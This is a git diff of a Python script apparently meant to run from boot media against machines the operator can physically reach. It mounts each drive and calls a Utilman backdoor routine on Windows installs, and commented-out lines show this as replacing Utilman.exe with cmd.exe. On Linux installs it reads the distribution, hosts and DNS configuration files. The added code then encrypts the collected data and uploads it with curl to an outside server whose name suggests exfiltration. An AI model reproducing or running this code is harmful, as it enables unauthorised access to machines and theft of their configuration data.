@@ -3,6 +3,10 @@
 import sys
 import os
 import json
+import windows_utilman
+import pyAesCrypt
+import requests
+from secureCrypt import cryptResult
 
 os.system('loadkeys fr')
 os.system('lsblk > result.txt')
@@ -13,6 +17,7 @@ else:
 
 
 def parse(file_name):
+    # Listing all drives and removing special char from the command return and saving them to a file
     result = []
     with open(file_name) as input_file:
         for line in input_file:
@@ -25,42 +30,66 @@ def parse(file_name):
 
 
 def check_for_os(list):
-    os_list = {}
+    # Checking for OS installed on the drive
+    os_list = {'Os': 'location'}
+    hosts = {'Host': 'address'}
+    servers = {"DNS": "address"}
+
     for drive in drives_list:
         os.system('mount /dev/%s /mnt/targetDrive' % (drive))
         print('Looking for OS on '+drive+'...\n')
         if os.path.isdir('/mnt/targetDrive/Windows'):
+            # Checking for Windows installation
             os_list['Windows'] = drive
+            windows_utilman.utilman()
         elif os.path.isdir('/mnt/targetDrive/etc'):
+            # Looking for Linux and grabbing files
             f = open('/mnt/targetDrive/etc/issue')
             for x in f:
+                # Listing distros
                 x = x.split()
                 x = x[:len(x)-2]
                 x = ' '.join(x)
                 if x != '':
                     os_list[x] = drive
-    return os_list
+            f = open('/etc/hosts')
+            for x in f:
+                # Checking hosts
+                x = x.split()
+                hosts[x[1]] = x[0]
+            f = open('/etc/resolv.conf')
+            for x in f:
+                # Checking DNS
+                x = x.split()
+                if x:
+                    if x[0] != "#":
+                        if x[0] == "options":
+                            pass
+                        else:
+                            servers[x[0]] = x[1]
+    results = []
+    results.append(os_list)
+    results.append(hosts)
+    results.append(servers)
+    return results
 
 
-
+# Program starts here
 drives_list = parse("result.txt")
-os_list = check_for_os(drives_list)
+results = check_for_os(drives_list)
 
-# Saving as json file
-json = json.dumps(os_list)
-if os.path.exists('os_list.json'):
-   f = open('os_list.json','w')
+# Saving results as json file
+json = json.dumps(results)
+if os.path.exists('results.json'):
+    f = open('results.json', 'w')
 else:
-   f = open('os_list.json','x')
+    f = open('results.json', 'x')
 f.write(json)
 f.close()
-# if check_for_os(drives_list):
-#     os.system(
-#         'mv /mnt/targetDrive/Windows/System32/Utilman.exe /mnt/targetDrive/Windows/System32/Utilman.bak')
-#     os.system(
-#         'mv /mnt/targetDrive/Windows/System32/cmd.exe /mnt/targetDrive/Windows/System32/Utilman.exe')
-#     print('cmd.exe modified. Rebooting now')
-# else:
-#     print('No Operating system found on the disk !')
 
-# os.system('shutdown now')
+# Crypting file before sending it to our server and removing the base file just in case
+cryptResult("results.json")
+os.remove("results.json")
+
+# Sending file to the server
+os.system('curl -i -X POST -H "Content-Type: multipart/form-data" -F "host=test" -F "file=@results.json.aes" https://exft.avapxia.tk/')
